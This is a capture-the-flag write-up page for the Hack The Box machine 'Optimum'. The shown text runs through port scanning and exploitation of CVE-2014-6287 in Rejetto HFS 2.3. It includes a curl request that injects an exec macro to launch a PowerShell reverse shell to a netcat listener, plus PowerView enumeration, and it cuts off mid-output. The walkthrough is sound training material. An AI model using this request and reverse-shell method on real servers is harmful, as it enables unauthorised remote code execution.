@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+        <meta name="author" content="Matthieu Mezirard">
+    
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta name="description" content="This is an easy Windows box.">
+    
+    <title>
+        
+            
+        
+        root@mmezirard:~&#x2F;htb-write-ups&#x2F;boxes&#x2F;optimum#
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Optimum<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2023-12-13</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/optimum/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#host-10-10-10-8">Host 10.10.10.8</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#scanning">Scanning</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#ports">Ports</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#fingerprinting">Fingerprinting</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#scripts">Scripts</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#services-enumeration">Services enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#hfs">HFS</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#foothold-cve-2014-6287">Foothold (CVE-2014-6287)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#preparation">Preparation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#exploitation">Exploitation</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#getting-a-lay-of-the-land">Getting a lay of the land</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#architecture">Architecture</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#version">Version</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#hotfixes">Hotfixes</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#users">Users</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#groups">Groups</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#nics">NICs</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#system-enumeration">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#flags">Flags</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#known-vulnerabilities-1">Known vulnerabilities</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#privilege-escalation-ms16-032">Privilege escalation (MS16-032)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#preparation-1">Preparation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#exploitation-1">Exploitation</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#system-enumeration-1">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#flags-1">Flags</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                        </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/optimum/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Windows</p>
+<p><strong>Release date</strong>: 2017-03-18</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/1">ch4p</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great
+practice security-wise, but it's a VM so it's alright. This way I won't have to
+prefix some commands with <code>sudo</code>, which gets cumbersome in the long run.</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting
+with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box.
+I'll call it <code>workspace</code>, and it will be located at the root of my filesystem
+<code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll use
+<code>httpsimpleserver</code> to create an HTTP server on port <code>80</code> and
+<code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make
+files in this folder available over the Internet, which will be especially
+useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory.
+This will come in handy once we get a foothold, for privilege escalation and
+for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the
+complexity of some exploits, and prefer a more manual approach when it's not too
+much hassle. This way, I'll have a better understanding of the exploits I'm
+running, and I'll have more control over what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.9</code>. The
+commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever
+need to transfer files or binaries to the target machine, I'll always place them
+in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="host-10-10-10-8">Host <code>10.10.10.8</code></h1>
+<h2 id="scanning">Scanning</h2>
+<h3 id="ports">Ports</h3>
+<p>As usual, let's start by initiating a port scan on Optimum using a TCP SYN
+<code>nmap</code> scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.8<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also check the 500 most common UDP ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.8<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>top-ports</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h3 id="fingerprinting">Fingerprinting</h3>
+<p>Following the ports scans, let's gather more data about the service associated
+with the open TCP port we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.8<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE VERSION
+</span><span class="z-text z-plain">80/tcp open  http    HttpFileServer httpd 2.3
+</span><span class="z-text z-plain">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code> managed to determine that Optimum is running Windows.</p>
+<h3 id="scripts">Scripts</h3>
+<p>Let's run <code>nmap</code>'s default scripts on the TCP service to see if they can find
+additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.8<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">|_http-title: HFS /
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h2 id="services-enumeration">Services enumeration</h2>
+<h3 id="hfs">HFS</h3>
+<h4 id="exploration">Exploration</h4>
+<p>Let's browse to <code>http://10.10.10.8/</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/optimum/hfs-homepage.png" alt="HFS homepage" /></p>
+<p>This is a standard HFS application.</p>
+<h4 id="fingerprinting-1">Fingerprinting</h4>
+<p>Let's fingerprint the technologies used by this web page with the
+<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/optimum/hfs-homepage-wappalyzer.png" alt="HFS homepage Wappalyzer extension" /></p>
+<h4 id="exploration-1">Exploration</h4>
+<p>Unfortunately, this HFS instance doesn't contain any files or folders.</p>
+<h4 id="known-vulnerabilities">Known vulnerabilities</h4>
+<p>The UI looks really outdated, and if we search online we find that the release
+date for this version is
+<a href="https://www.neowin.net/software/hfs---http-file-server-23-build-288/">February 17, 2014</a>.
+It must be vulnerable to some CVEs! Let's search
+<a href="https://www.exploit-db.com/">ExploitDB</a> for <code>HttpFileServer</code>.</p>
+<p>We find one exploit that matches the version of the HFS instance:
+<a href="https://www.exploit-db.com/exploits/49125">Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)</a>
+(<a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6287">CVE-2014-6287</a>). This looks
+really promising!</p>
+<h2 id="foothold-cve-2014-6287">Foothold (<a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6287">CVE-2014-6287</a>)</h2>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6287">CVE-2014-6287</a> is a
+vulnerability in Rejetto HTTP File Server version <code>2.3</code>. The issue lies
+specifically in the <code>findMacroMarker</code> function, used to locate the boundaries of
+macros within configuration files. This function is vulnerable to a null-byte
+injection attack, meaning that an attacker can inject a null byte <code>%00</code> into a
+configuration file, which would cause the function to terminate prematurely.
+This function is used by the search functionality, so an attacker can send a
+specific payload to the endpoint responsible for searching to get RCE.</p>
+<h3 id="preparation">Preparation</h3>
+<p>The goal is to obtain a reverse shell.</p>
+<p>First, I'll setup a listener to receive the shell.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>9001<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Then, I'll choose the URL encoded version of the 'Powershell #3 (Base64)'
+payload from <a href="https://www.revshells.com/">RevShells</a>.</p>
+<p>I'll save it as the <code>URL_ENCODED_REVSHELL_PAYLOAD</code> shell variable.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>Let's exploit this CVE to execute our payload.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/dev/null<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.10.8/?search=%00%7B%7B.exec|<span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">URL_ENCODED_REVSHELL_PAYLOAD</span></span>.%7D%7D<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>If we check our listener:</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.9] from (UNKNOWN) [10.10.10.8] 49158
+</span><span class="z-text z-plain">PS C:\Users\kostas\Desktop&gt;
+</span></code></pre>
+<p>It caught the reverse shell!</p>
+<h2 id="getting-a-lay-of-the-land">Getting a lay of the land</h2>
+<p>If we run <code>whoami</code>, we see that we got a foothold as <code>kostas</code>.</p>
+<h3 id="architecture">Architecture</h3>
+<p>What is Optimum's architecture?</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\kostas\Desktop<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-ItemProperty</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>Path <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>ExpandProperty <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>PROCESSOR_ARCHITECTURE<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">AMD64
+</span></code></pre>
+<p>It's using AMD64. Let's keep that in mind to select the appropriate binaries.</p>
+<h3 id="version">Version</h3>
+<p>Let's gather some information about the Windows version of Optimum.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\kostas\Desktop<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-ItemProperty</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>Path <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-List</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>Property <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>ProductName<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span><span class="z-keyword z-operator z-other z-powershell">,</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>CurrentBuildNumber<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">ProductName        : Windows Server 2012 R2 Standard
+</span><span class="z-text z-plain">CurrentBuildNumber : 9600
+</span></code></pre>
+<p>In fact, it's Windows Server 2012 R2 Standard build <code>9600</code>.</p>
+<h3 id="hotfixes">Hotfixes</h3>
+<p>Let's retrieve the list of installed hotfixes.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\kostas\Desktop<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-HotFix</span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>ExpandProperty <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HotFixID<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">KB2959936
+</span><span class="z-text z-plain">KB2896496
+</span><span class="z-text z-plain">KB2919355
+</span><span class="z-text z-plain">KB2920189
+</span><span class="z-text z-plain">KB2928120
+</span><span class="z-text z-plain">KB2931358
+</span><span class="z-text z-plain">KB2931366
+</span><span class="z-text z-plain">KB2933826
+</span><span class="z-text z-plain">KB2938772
+</span><span class="z-text z-plain">KB2949621
+</span><span class="z-text z-plain">KB2954879
+</span><span class="z-text z-plain">KB2958262
+</span><span class="z-text z-plain">KB2958263
+</span><span class="z-text z-plain">KB2961072
+</span><span class="z-text z-plain">KB2965500
+</span><span class="z-text z-plain">KB2966407
+</span><span class="z-text z-plain">KB2967917
+</span><span class="z-text z-plain">KB2971203
+</span><span class="z-text z-plain">KB2971850
+</span><span class="z-text z-plain">KB2973351
+</span><span class="z-text z-plain">KB2973448
+</span><span class="z-text z-plain">KB2975061
+</span><span class="z-text z-plain">KB2976627
+</span><span class="z-text z-plain">KB2977629
+</span><span class="z-text z-plain">KB2981580
+</span><span class="z-text z-plain">KB2987107
+</span><span class="z-text z-plain">KB2989647
+</span><span class="z-text z-plain">KB2998527
+</span><span class="z-text z-plain">KB3000850
+</span><span class="z-text z-plain">KB3003057
+</span><span class="z-text z-plain">KB3014442
+</span></code></pre>
+<h3 id="users">Users</h3>
+<p>Let's enumerate all users using <code>PowerView</code>.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\kostas\Desktop<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-NetLocalGroupMember</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>GroupName <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>Users<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Where-Object</span> <span class="z-meta z-scriptblock z-powershell"><span class="z-punctuation z-section z-braces z-begin z-powershell">{</span> <span class="z-support z-variable z-automatic z-powershell"><span class="z-punctuation z-definition z-variable z-powershell">$</span>_<span class="z-variable z-other z-member z-powershell">.MemberName</span></span> <span class="z-keyword z-operator z-comparison z-powershell">-notmatch</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>NT AUTHORITY<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-punctuation z-section z-braces z-end z-powershell">}</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>MemberName<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span><span class="z-keyword z-operator z-other z-powershell">,</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>SID<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-Table</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>AutoSize
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">MemberName     SID
+</span><span class="z-text z-plain">----------     ---
+</span><span class="z-text z-plain">OPTIMUM\kostas S-1-5-21-605891470-2991919448-81205106-1001
+</span></code></pre>
+<p>There's only <code>kostas</code> (us).</p>
+<p>What about the administrators?</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\kostas\Desktop<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-NetLocalGroupMember</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>GroupName <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>Administrators<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Where-Object</span> <span class="z-meta z-scriptblock z-powershell"><span class="z-punctuation z-section z-braces z-begin z-powershell">{</span> <span class="z-support z-variable z-automatic z-powershell"><span class="z-punctuation z-definition z-variable z-powershell">$</span>_<span class="z-variable z-other z-member z-powershell">.MemberName</span></span> <span class="z-keyword z-operator z-comparison z-powershell">-notmatch</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>NT AUTHORITY<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-punctuation z-section z-braces z-end z-powershell">}</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>MemberName<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span><span class="z-keyword z-operator z-other z-powershell">,</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>SID<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-Table</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>AutoSize
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">MemberName            SID
+</span><span class="z-text z-plain">----------            ---
+</span><span class="z-text z-plain">OPTIMUM\Administrator S-1-5-21-605891470-2991919448-81205106-500
+</span></code></pre>
+<p>We only find the built-in <code>Administrator</code>.</p>
+<h3 id="groups">Groups</h3>
+<p>Let's enumerate all groups, once again using <code>PowerView</code>.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\kostas\Desktop<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-NetLocalGroup</span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>GroupName<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span><span class="z-keyword z-operator z-other z-powershell">,</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>Comment<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-Table</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>AutoSize
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">GroupName                           Comment
+</span><span class="z-text z-plain">---------                           -------
+</span><span class="z-text z-plain">Access Control Assistance Operators Members of this group can remotely query authorization attributes and permissions for resources on this computer.
+</span><span class="z-text z-plain">Administrators                      Administrators have complete and unrestricted access to the computer/domain        
+</span><span class="z-text z-plain">Backup Operators                    Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
+</span><span class="z-text z-plain">Certificate Service DCOM Access     Members of this group are allowed to connect to Certification Authorities in the enterprise
+</span><span class="z-text z-plain">Cryptographic Operators             Members are authorized to perform cryptographic operations.                        
+</span><span class="z-text z-plain">Distributed COM Users               Members are allowed to launch, activate and use Distributed COM objects on this machine.
